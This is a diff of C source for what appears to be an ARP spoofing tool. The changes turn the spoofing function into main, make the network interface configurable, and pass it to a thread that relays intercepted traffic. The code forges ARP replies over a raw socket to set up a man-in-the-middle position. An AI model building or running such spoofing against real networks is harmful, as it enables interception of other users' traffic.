@@ -9,6 +9,11 @@ struct thread_arg
     struct in_addr target_ip;
     struct in_addr host_ip;
 };
+struct relay_thread_arg
+{
+    uint8_t *mac;
+    char *if_name;
+};
 struct arp_data
 {
     uint8_t target_mac[6];
@@ -20,7 +25,7 @@ void *thread_relay(void *p);
 void INThandler(int sig);
 void print_packet(struct in_addr * host_ip, uint8_t *host_mac, struct in_addr *target_ip, uint8_t *target_mac);
 
-int arp_spoof(int argc, char **argv)
+int main(int argc, char **argv)
 {
     int sock, len,result;
     struct sockaddr_ll sll;
@@ -29,7 +34,9 @@ int arp_spoof(int argc, char **argv)
     struct in_addr target_ip, host_ip;
     pthread_t thread_id;
     struct thread_arg thread_arg;
+    struct relay_thread_arg r_arg;
     struct arp_data *arp_data;
+    char * if_name = IF_NAME;
     
 
     if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)
@@ -38,7 +45,7 @@ int arp_spoof(int argc, char **argv)
         return -1;
     }
 
-    if(get_info(&info, "eth0")<0)
+    if(get_info(&info, if_name)<0)
     {
         printf("Interface Name error\n");
         return -1;
@@ -78,7 +85,9 @@ int arp_spoof(int argc, char **argv)
     if(arp_data == NULL)
         return -1;
     
-    pthread_create(&thread_id, NULL, thread_relay, arp_data->host_mac);
+    r_arg.mac = arp_data->host_mac;
+    r_arg.if_name = if_name;
+    pthread_create(&thread_id, NULL, thread_relay, &r_arg);
 
     buffer = make_arp_reply_packet(info.my_mac, host_ip ,arp_data->target_mac ,target_ip);
 
@@ -169,8 +178,8 @@ void *thread_recivarp(void *p)
 
 void *thread_relay(void *p)
 {
-    uint8_t *mac = (uint8_t *)p;
-    relay(mac);
+    struct relay_thread_arg *r_arg = (struct relay_thread_arg *)p;
+    relay(r_arg->mac, r_arg->if_name);
 }
 
 void INThandler(int sig)
